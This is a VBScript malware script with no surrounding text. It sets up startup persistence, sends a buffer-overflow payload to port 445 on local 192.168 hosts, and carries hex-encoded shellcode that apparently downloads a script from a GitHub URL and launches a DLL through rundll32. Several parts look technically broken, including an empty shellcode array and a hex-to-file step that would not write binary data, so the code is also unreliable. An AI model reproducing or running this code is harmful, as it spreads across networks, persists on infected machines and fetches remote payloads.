Dim filenames(4)
filenames(0) = "rhl.vbs"
filenames(1) = "littlejoe.vbs"
filenames(2) = "lj.vbs"
filenames(3) = "go.bat"
filenames(4) = "nogapi.dll"

Dim currentDirectory
Set fso = CreateObject("Scripting.FileSystemObject")
currentDirectory = fso.GetAbsolutePathName(".")

Set files = fso.GetFolder(currentDirectory).Files
For Each file In files
    For Each filename In filenames
        If LCase(file.Name) = LCase(filename) Then
            Set WshShell = CreateObject("WScript.Shell")
            startupPath = WshShell.SpecialFolders("Startup")
            Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
            registryKey.TargetPath = file.Path
            registryKey.Save
            Exit For
        End If
    Next
Next
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Function s78()
    Dim arrIPAddresses
    arrIPAddresses = GetIPAddresses()

    For Each strIPAddress in arrIPAddresses
    On Error Resume Next
    Set tcpClient = CreateObject("MSWinsock.Winsock")
    host = strIPAddress
    port = 445
    offset = 2000

    ' Offset and return address
    ret = Array(&H8F, &H35, &H4A, &H5F)

    shellcode = Array()

    buf = "USER " & String(offset, "A") & ChrW(ret(0)) & ChrW(ret(1)) & ChrW(ret(2)) & ChrW(ret(3))
    For i = 1 To 20
        buf = buf & ChrW(&H90)
    Next
    For i = 0 To UBound(shellcode)
        buf = buf & ChrW(shellcode(i))
    Next
    buf = buf & vbCrLf

    tcpClient.Connect host, port

    tcpClient.SendData buf

    Do While tcpClient.State <> 0
        If tcpClient.State = 7 Then
            response = tcpClient.GetData
            WScript.Echo response
            Exit Do
        End If
        WScript.Sleep 100
    Loop

    tcpClient.Close
    If Err.Number = 0 Then
        ' Script executed successfully on remote machine
    End If
    Next
End Function

Function dmn()
Set objShell = CreateObject("WScript.Shell")
strCode = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6989e654684c772607ffd531ff5757575756683a5679a7ffd5eb635b31c951516a03515168bb01000053506857899fc6ffd5eb4f5931d252680032a08452525251525068eb552e3bffd589c66a105b688033000089e06a04506a1f566875469e86ffd531ff5757575756682d06187bffd585c0754d4b0f84aa000000ebd1e9bc000000e8acffffff2f6b616f735365632f6b616f73546f6f6c732f7261772f6d61696e2f6c75767a6d6973637662732f6c6974746c656a6f652f72686c2e76627300eb6b31c05f506a026a02506a026a025768daf6da4fffd59331c066b8040329c4548d4c240831c0b40350515668129689e2ffd585c0742d5885c074166a0054508d44240c5053682d57ae5bffd583ec04ebce5368c6968752ffd56a005768318b6f87ffd56a0068f0b5a256ffd5e890ffffff72756e6431312e65786500e8d7feffff6769746875622e636f6d00"
For i = 1 to Len(strCode) Step 2
    objShell.Run "cmd /c echo|" & Mid(strCode, i, 2) & " /nologo >> nogapi.dll", 0, True
Next
dllPath = "nogapi.dll"

Set kernel32 = GetObject("winmgmts:root\cimv2:Win32_Process")
result = kernel32.Create("rundll32 """ & dllPath & """,DllRegisterServer")
End Function
s78()
dmn()
